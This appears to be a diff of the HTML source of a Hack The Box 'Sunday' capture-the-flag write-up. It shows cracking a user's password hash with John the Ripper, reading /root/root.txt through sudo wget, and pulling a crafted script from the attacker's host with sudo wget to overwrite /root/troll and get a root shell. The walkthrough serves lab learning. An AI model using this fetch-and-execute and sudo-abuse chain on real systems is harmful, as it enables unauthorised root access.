-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sammy@sunday:~$ sudo wget http://10.10.14.38/craft.sh -O /root/troll
-</span></span><span style=display:flex><span>--17:17:14--  http://10.10.14.38/craft.sh
-</span></span><span style=display:flex><span>           <span style=color:#ff79c6>=</span>&gt; <span style=color:#f1fa8c>`</span>/root/troll<span style=color:#f1fa8c>&#39;
-</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>Connecting to 10.10.14.38:80... connected.
-</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>HTTP request sent, awaiting response... 200 OK
-</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>Length: 22 [text/x-sh]
-</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
-</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>100%[==========================================================================&gt;] 22            --.--K/s
-</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
-</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>17:17:14 (5.61 KB/s) - `/root/troll&#39;</span> saved <span style=color:#ff79c6>[</span>22/22<span style=color:#ff79c6>]</span>
-</span></span></code></pre></td></tr></table></div></div><p>As user sunny:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sunny@sunday:~$ sudo /root/troll
-</span></span><span style=display:flex><span>root@sunday:~# id
-</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>uid</span><span style=color:#ff79c6>=</span>0<span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>gid</span><span style=color:#ff79c6>=</span>0<span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>groups</span><span style=color:#ff79c6>=</span>0<span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span>,1<span style=color:#ff79c6>(</span>other<span style=color:#ff79c6>)</span>,2<span style=color:#ff79c6>(</span>bin<span style=color:#ff79c6>)</span>,3<span style=color:#ff79c6>(</span>sys<span style=color:#ff79c6>)</span>,4<span style=color:#ff79c6>(</span>adm<span style=color:#ff79c6>)</span>,5<span style=color:#ff79c6>(</span>uucp<span style=color:#ff79c6>)</span>,6<span style=color:#ff79c6>(</span>mail<span style=color:#ff79c6>)</span>,7<span style=color:#ff79c6>(</span>tty<span style=color:#ff79c6>)</span>,8<span style=color:#ff79c6>(</span>lp<span style=color:#ff79c6>)</span>,9<span style=color:#ff79c6>(</span>nuucp<span style=color:#ff79c6>)</span>,12<span style=color:#ff79c6>(</span>daemon<span style=color:#ff79c6>)</span>
-</span></span><span style=display:flex><span>root@sunday:~# cat /root/root.txt
-</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>REDACTED<span style=color:#ff79c6>]</span>
-</span></span></code></pre></td></tr></table></div></div></div></article><hr><div class=sharing-buttons><a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&title=HTB%20-%20Sunday&caption=HTB%20-%20Sunday&canonicalUrl=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on tumblr"><div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg></div></div></a><a class=resp-sharing-button__link href="mailto:?subject=HTB%20-%20Sunday&body=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_self rel=noopener aria-label title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div></div></a><a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f&media=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f;description=HTB%20-%20Sunday" target=_blank rel=noopener aria-label title="Share on pinterest"><div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f&title=HTB%20-%20Sunday&summary=HTB%20-%20Sunday&source=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on linkedin"><div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></div></div></a><a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f&resubmit=true&title=HTB%20-%20Sunday" target=_blank rel=noopener aria-label title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f;title=HTB%20-%20Sunday" target=_blank rel=noopener aria-label title="Share on xing"><div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg></div></div></a><a class=resp-sharing-button__link href="whatsapp://send?text=HTB%20-%20Sunday%20https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on whatsapp"><div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f&t=HTB%20-%20Sunday" target=_blank rel=noopener aria-label title="Share on hacker news"><div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://telegram.me/share/url?text=HTB%20-%20Sunday&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on telegram"><div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></div></div></a></div><hr><div class=pagination><div class=pagination__title><span class=pagination__title-h></span></div><div class=pagination__buttons><a href=https://0xade1.github.io/posts/2020/09/htb-tenten/ class="button previous"><span class=button__icon>←</span>
-<span class=button__text>HTB - Tenten</span></a>
-<a href=https://0xade1.github.io/posts/2020/09/htb-optimum/ class="button next"><span class=button__text>HTB - Optimum</span>
-<span class=button__icon>→</span></a></div></div><hr></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2022</span>
-<span><a href=https://0xade1.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>Made with &#10084;</span></div></div></footer></div><script type=text/javascript src=https://0xade1.github.io/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5+q9hMmUsWWGa7+YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE+kyEg=="></script></body></html>
+</code></pre><p>We copy for john the ripper</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>_  sunday <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#39;sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::&#39;</span> &gt; crack.txt
+_  sunday /opt/john/run/john --wordlist<span style=color:#ff79c6>=</span>/opt/dictionaries/rockyou.txt crack.txt
+Using default input encoding: UTF-8
+Loaded <span style=color:#bd93f9>1</span> password <span style=color:#8be9fd;font-style:italic>hash</span> <span style=color:#ff79c6>(</span>sha256crypt, crypt<span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>$5</span>$ <span style=color:#ff79c6>[</span>SHA256 128/128 AVX 4x<span style=color:#ff79c6>])</span>
+Cost <span style=color:#bd93f9>1</span> <span style=color:#ff79c6>(</span>iteration count<span style=color:#ff79c6>)</span> is <span style=color:#bd93f9>5000</span> <span style=color:#ff79c6>for</span> all loaded hashes
+Will run <span style=color:#bd93f9>4</span> OpenMP threads
+Press <span style=color:#f1fa8c>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#ff79c6>for</span> status
+cooldude!        <span style=color:#ff79c6>(</span>sammy<span style=color:#ff79c6>)</span>
+1g 0:00:00:44 DONE <span style=color:#ff79c6>(</span>2020-09-19 19:00<span style=color:#ff79c6>)</span> 0.02269g/s 4624p/s 4624c/s 4624C/s dominique15..chronic69
+Use the <span style=color:#f1fa8c>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></td></tr></table>
+</div>
+</div><p>sammy:cooldude!</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>_  .ssh ssh -p <span style=color:#bd93f9>22022</span> -oKexAlgorithms<span style=color:#ff79c6>=</span>+diffie-hellman-group1-sha1  sammy@10.10.10.76
+Password:
+Last login: Sat Sep <span style=color:#bd93f9>19</span> 16:34:56 <span style=color:#bd93f9>2020</span> from 10.10.14.38
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November <span style=color:#bd93f9>2008</span>
+sammy@sunday:~$ ls
+Desktop  Documents  Downloads  Public
+sammy@sunday:~$ <span style=color:#8be9fd;font-style:italic>cd</span> Deskto
+sammy@sunday:~$ ls Desktop
+user.txt
+sammy@sunday:~$ cat Desktop/user.txt
+<span style=color:#ff79c6>[</span>REDACTED<span style=color:#ff79c6>]</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id=root-flag-without-privilege-escalation>root flag without privilege escalation</h1>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sammy@sunday:~$ sudo -l
+User sammy may run the following commands on this host:
+    <span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span> NOPASSWD: /usr/bin/wget
+</code></pre></td></tr></table>
+</div>
+</div><p>As we know which file we are looking for, The easiest way to get the root flag is:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sammy@sunday:~$ sudo wget -i /root/root.txt
+//root/root.txt: Invalid URL <span style=color:#ff79c6>[</span>REDACTED<span style=color:#ff79c6>]</span>: Unsupported scheme
+No URLs found in /root/root.txt.
+</code></pre></td></tr></table>
+</div>
+</div><h1 id=privilege-escalation>privilege escalation</h1>
+<p>The attack path is:</p>
+<ol>
+<li>sunny is allowed to execute dummy /root/troll with sudo</li>
+<li>if we can overwrite /root/troll to get a shell, then we can become root</li>
+<li>sammy has the ability to download as root with sudo</li>
+<li>Then sammy can overwrite /root/troll with <code>sudo wget http://... -O /root/troll</code></li>
+<li>in fact sunny will execute a crafted script that sammy will wget to overwrite /root/troll</li>
+<li>the crafted script will open a shell as root</li>
+</ol>
+<p>We can craft a script, and prepare the http server for the upload</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ctf@014202efa8c8:~/htb/sunday/http$ mkdir http  <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#8be9fd;font-style:italic>cd</span> http
+ctf@014202efa8c8:~/htb/sunday/http$ cat <span style=color:#f1fa8c>&lt;&lt; EOF &gt; crafted.sh
+</span><span style=color:#f1fa8c>&gt; #!/bin/bash
+</span><span style=color:#f1fa8c>&gt; /bin/bash
+</span><span style=color:#f1fa8c>&gt; EOF</span>
+ctf@014202efa8c8:~/htb/sunday/http$ cat crafted.sh
+<span style=color:#6272a4>#!/bin/bash</span>
+/bin/bash
+ctf@014202efa8c8:~/htb/sunday/http$ sudo python3 -m http.server <span style=color:#bd93f9>80</span>
+<span style=color:#ff79c6>[</span>sudo<span style=color:#ff79c6>]</span> password <span style=color:#ff79c6>for</span> ctf:
+Serving HTTP on 0.0.0.0 port <span style=color:#bd93f9>80</span> <span style=color:#ff79c6>(</span>http://0.0.0.0:80/<span style=color:#ff79c6>)</span> ...
+</code></pre></td></tr></table>
+</div>
+</div><p>| We have to be very fast because the /root/troll is restored every seconds</p>
+<p>As user sammy:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span></code></pre></td>
